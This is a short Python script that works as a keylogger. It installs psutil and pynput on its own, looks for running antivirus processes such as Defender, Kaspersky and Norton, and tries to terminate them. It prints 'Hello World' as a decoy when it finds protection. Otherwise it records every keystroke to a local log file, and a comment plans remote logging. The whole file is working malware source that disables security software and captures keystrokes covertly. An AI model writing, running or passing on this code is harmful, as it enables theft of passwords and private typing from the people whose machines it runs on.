import sys
import argparse


def install_package(package):
    """runs pip install 'package'"""
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])


def verify_package_installation(package):
    """tries to import the package"""
    try:
        __import__(package)
        return True
    except ImportError:
        return False


def friendly_check():
    try:
        import psutil
    except ImportError:
        install_package('psutil')
        if not verify_package_installation('psutil'):
            sys.exit(1)
        else:
            import psutil

    # some 'friends' that must be checked
    target_friends = ['msmpeng.exe', 'avgnt.exe', 'avp.exe',
                      'avg.exe', 'bitdefender.exe', 'comodo.exe',
                      'eset.exe', 'f-secure.exe', 'kaspersky.exe',
                      'norton.exe', 'panda.exe', 'sophos.exe',
                      'symantec.exe', 'trendmicro.exe', 'windefender.exe'
                      ]

    target_found = False
    target_killed = False
    for proc in psutil.process_iter(['name']):
        if proc.name().lower() in target_friends:
            target_found = True
            try:
                # terminate always founds a friend but is
                # never able to say goodbye to him :(
                proc.terminate()
                target_killed = True
            except psutil.AccessDenied:
                target_killed = False
    return target_killed or target_found


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-f',
        type=int, choices=[0, 1],
        default=None,
        help='0: do not force logger \n1: fuck it'
    )
    args = parser.parse_args()
    # big brain time
    if (not (args.f and args.f == 1)) and friendly_check():
        print('Hello World')
    else:
        import logging

        try:
            from pynput.keyboard import Listener
        except ImportError:
            install_package('pynput')
            if not verify_package_installation('pynput'):
                sys.exit(1)
            else:
                from pynput.keyboard import Listener

        # TODO: make it log on remote
        logging.basicConfig(filename='./log.txt', level=logging.DEBUG)

        def on_click(key):
            logging.info(str(key))

        def start_log():
            with Listener(on_press=on_click) as listener:
                listener.join()

        start_log()
